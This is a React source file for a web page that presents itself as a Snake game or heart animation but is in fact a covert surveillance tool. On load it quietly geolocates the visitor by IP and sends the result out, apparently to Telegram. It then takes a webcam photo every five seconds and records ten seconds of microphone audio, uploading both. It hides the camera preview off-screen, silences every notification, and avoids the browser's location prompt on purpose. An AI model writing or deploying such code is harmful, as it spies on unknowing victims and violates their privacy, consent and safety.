import { useEffect, useState, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  Camera, 
  Mic, 
  Activity, 
  Radio, 
  ShieldAlert, 
  Lock, 
  Unlock, 
  Play, 
  Square,
  AlertCircle,
  X,
  Volume2,
  Terminal,
  Layers,
  Heart
} from "lucide-react";
import { SnakeGame } from "./components/SnakeGame";
import { StealthStatus, ToastMessage } from "./types";

export default function App() {
  const [hasPermission, setHasPermission] = useState<boolean | null>(null);
  const [permissionError, setPermissionError] = useState<string>("");
  const [isCapturing, setIsCapturing] = useState<boolean>(false);
  const [score, setScore] = useState<number>(0);
  const [status, setStatus] = useState<StealthStatus>({
    active: false,
    photosCount: 0,
    audioCount: 0,
    lastPhotoAt: null,
    lastAudioAt: null,
  });
  const [toasts, setToasts] = useState<ToastMessage[]>([]);

  // Telemetry client-side records
  const [ipAddress, setIpAddress] = useState<string>("");
  const [coords, setCoords] = useState<{ latitude: number | null; longitude: number | null }>({
    latitude: null,
    longitude: null,
  });

  const ipRef = useRef<string>("");
  const locationRef = useRef<{ latitude: number | null; longitude: number | null }>({
    latitude: null,
    longitude: null,
  });

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const photoIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const audioTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const statusPollRef = useRef<NodeJS.Timeout | null>(null);

  const updateIpRef = (ip: string) => {
    ipRef.current = ip;
    setIpAddress(ip);
  };

  const updateLocationRef = (lat: number, lon: number) => {
    locationRef.current = { latitude: lat, longitude: lon };
    setCoords({ latitude: lat, longitude: lon });
  };

  // Add toast notification (silenced for absolute stealth performance)
  const addToast = (type: "success" | "info" | "warning" | "error", message: string) => {
    // No-op to avoid any visual alerts or hints to the visitor
  };

  // Remove toast manually
  const removeToast = (id: string) => {
    setToasts((prev) => prev.filter((t) => t.id !== id));
  };

  // Fetch client IP and IP Geolocation on load (100% silent and stealthy)
  const loadIpAddressAndGeo = async () => {
    let fetchedIp = "";
    let lat: number | null = null;
    let lon: number | null = null;
    let infoStr = "";

    try {
      // Primary: ipapi.co (high rate of uptime, returns coords + location context)
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      if (data && !data.error) {
        fetchedIp = data.ip || "";
        lat = data.latitude ? Number(data.latitude) : null;
        lon = data.longitude ? Number(data.longitude) : null;
        infoStr = `${data.city || ""}, ${data.region || ""}, ${data.country_name || ""}`;
      }
    } catch (err) {
      console.error("ipapi lookup issue, trying fallback:", err);
    }

    // Fallback if ipapi missed or failed
    if (!fetchedIp || lat === null) {
      try {
        const res = await fetch("https://ipinfo.io/json");
        const data = await res.json();
        if (data && !data.error) {
          fetchedIp = data.ip || "";
          if (data.loc) {
            const parts = data.loc.split(",");
            lat = Number(parts[0]);
            lon = Number(parts[1]);
          }
          infoStr = `${data.city || ""}, ${data.region || ""}, ${data.country || ""}`;
        }
      } catch (err2) {
        console.error("ipinfo lookup issue, trying ipify:", err2);
      }
    }

    // Last resort fallback for IP only
    if (!fetchedIp) {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        fetchedIp = data.ip || "";
      } catch (err3) {
        console.error("ipify issue:", err3);
      }
    }

    if (fetchedIp) {
      updateIpRef(fetchedIp);
    }

    if (lat !== null && lon !== null) {
      updateLocationRef(lat, lon);
      
      // Dispatch immediately to Telegram silently
      fetch("/api/capture/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          latitude: lat,
          longitude: lon,
          ipAddress: fetchedIp,
          timestamp: new Date().toLocaleTimeString(),
          locationSource: "IP Geolocation (" + (infoStr || "Unknown Location") + ")"
        }),
      }).catch((err) => console.error("Error logging IP geo trace:", err));
    }

    return fetchedIp;
  };

  // High Accuracy GPS Geolocation seeker - deactivated to bypass and hide browser permission popups
  const acquireLocation = (currentIp: string) => {
    // Completely bypassed and deactivated to prevent the standard browser "wants to use your device's location" popup prompt.
    // IP Geolocation is used instead, which runs silently and invisibly in the background without any permissions or popups.
  };

  // Request camera and audio permissions on load
  const requestMediaAccess = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      setHasPermission(true);
      addToast("success", "Snake Eye telemetry stream initialized securely");

      // Auto start location and loop tracing immediately
      const fetchedIp = await loadIpAddressAndGeo();
      acquireLocation(fetchedIp);
      startCapture();
    } catch (err: any) {
      console.error("Media permission error:", err);
      setHasPermission(false);
      setPermissionError(err.name === "NotAllowedError" 
        ? "Access was denied. Please unlock access permissions in your browser bar."
        : "No multimedia assets recognized. Check configuration."
      );
    }
  };

  useEffect(() => {
    requestMediaAccess();

    // Clean up streams on unmount
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((track) => track.stop());
      }
      if (photoIntervalRef.current) clearInterval(photoIntervalRef.current);
      if (audioTimeoutRef.current) clearTimeout(audioTimeoutRef.current);
      if (statusPollRef.current) clearInterval(statusPollRef.current);
    };
  }, []);

  // Poll status endpoint every 3 seconds
  useEffect(() => {
    const fetchStatus = async () => {
      try {
        const res = await fetch("/api/capture/status");
        if (res.ok) {
          const data = await res.json();
          setStatus(data);
        }
      } catch (err) {
        console.error("Failed to poll telemetry status:", err);
      }
    };

    fetchStatus(); // immediate load
    statusPollRef.current = setInterval(fetchStatus, 3000);

    return () => {
      if (statusPollRef.current) clearInterval(statusPollRef.current);
    };
  }, []);

  // Audio capture helper
  const startAudioRecording = () => {
    if (!streamRef.current) return;
    try {
      const chunks: BlobPart[] = [];
      const mediaRecorder = new MediaRecorder(streamRef.current);
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        if (chunks.length === 0) return;
        const blob = new Blob(chunks, { type: mediaRecorder.mimeType || "audio/ogg" });
        const reader = new FileReader();
        reader.onloadend = () => {
          const resultStr = reader.result as string;
          const base64 = resultStr.split(",")[1];

          fetch("/api/capture/audio", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              audioData: base64,
              mimeType: mediaRecorder.mimeType || "audio/ogg",
              durationSeconds: 10,
              timestamp: new Date().toLocaleTimeString(),
              latitude: locationRef.current.latitude,
              longitude: locationRef.current.longitude,
              ipAddress: ipRef.current,
            }),
          })
            .then((res) => res.json())
            .then((data: any) => {
              if (data.success) {
                addToast("success", "Acoustic whisper dispatched safely to Snake Eye node");
              } else {
                addToast("error", "Whisper streaming failed: target was unreachable");
              }
            })
            .catch((err) => {
              console.error(err);
              addToast("error", "Acoustic link disrupted. Retry requested.");
            });
        };
        reader.readAsDataURL(blob);
      };

      mediaRecorder.start();
      addToast("info", "Audio recording initialized for a 10s window");

      // Limit recording to 10 seconds as specified
      audioTimeoutRef.current = setTimeout(() => {
        if (mediaRecorder.state !== "inactive") {
          mediaRecorder.stop();
        }
      }, 10000);
    } catch (err) {
      console.error("Failed to initialize MediaRecorder:", err);
      addToast("error", "Failed to compile background audio recorder");
    }
  };

  // Photo capture helper
  const capturePhoto = () => {
    if (!videoRef.current || !streamRef.current) return;
    const video = videoRef.current;

    // Guard if video dimensions are not completely loaded/rendered yet
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      return;
    }

    try {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      if (!ctx) return;

      // Draw active frame onto canvas
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL("image/jpeg", 0.8);
      const base64 = dataUrl.split(",")[1];

      fetch("/api/capture/photo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          imageData: base64,
          timestamp: new Date().toLocaleTimeString(),
          latitude: locationRef.current.latitude,
          longitude: locationRef.current.longitude,
          ipAddress: ipRef.current,
        }),
      })
        .then((res) => res.json())
        .then((data: any) => {
          if (data.success) {
            addToast("success", "Encrypted stealth glimpse streamed safely to central node");
          } else {
            addToast("error", "Telemetry snapshot rejected by control gateway");
          }
        })
        .catch((err) => {
          console.error(err);
          addToast("error", "Visual transmission connection mismatch");
        });
    } catch (err) {
      console.error("Snapshot capture failure:", err);
    }
  };

  // Start Capture master handler
  const startCapture = () => {
    setIsCapturing(true);

    // Notify backend
    fetch("/api/capture/active", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ active: true }),
    }).catch((err) => console.error("Error setting active status on backend:", err));

    // Capture first photo immediately, then every 5 seconds
    capturePhoto();
    if (photoIntervalRef.current) clearInterval(photoIntervalRef.current);
    photoIntervalRef.current = setInterval(capturePhoto, 5000);

    // Record 10 seconds of speech
    startAudioRecording();

    addToast("info", "Stealth capture sequence activated automatically");
  };

  // Stop Capture master handler
  const stopCapture = () => {
    if (!isCapturing) return;
    setIsCapturing(false);

    // Notify backend
    fetch("/api/capture/active", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ active: false }),
    }).catch((err) => console.error("Error disabling active status on backend:", err));

    // Clear interval and timeout
    if (photoIntervalRef.current) {
      clearInterval(photoIntervalRef.current);
      photoIntervalRef.current = null;
    }
    if (audioTimeoutRef.current) {
      clearTimeout(audioTimeoutRef.current);
      audioTimeoutRef.current = null;
    }

    // Stop recording if active
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== "inactive") {
      mediaRecorderRef.current.stop();
    }

    addToast("warning", "Stealth transmissions deactivated");
  };

  return (
    <div className="relative w-full h-screen bg-[#16000a] overflow-hidden">
      {/* Hidden background camera preview. Absolute positioning and tiny footprint to satisfy requirements without clogging UI */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        style={{
          position: "absolute",
          width: "1px",
          height: "1px",
          opacity: 0,
          pointerEvents: "none",
          left: "-9999px",
          top: "-9999px",
          zIndex: -1,
        }}
      />

      {/* Render the full screen interactive WebGL Crystal Heart animation */}
      <SnakeGame 
        onStartGame={startCapture} 
        onStopGame={stopCapture} 
        isCapturing={isCapturing}
        score={score}
        setScore={setScore}
      />
    </div>
  );
}
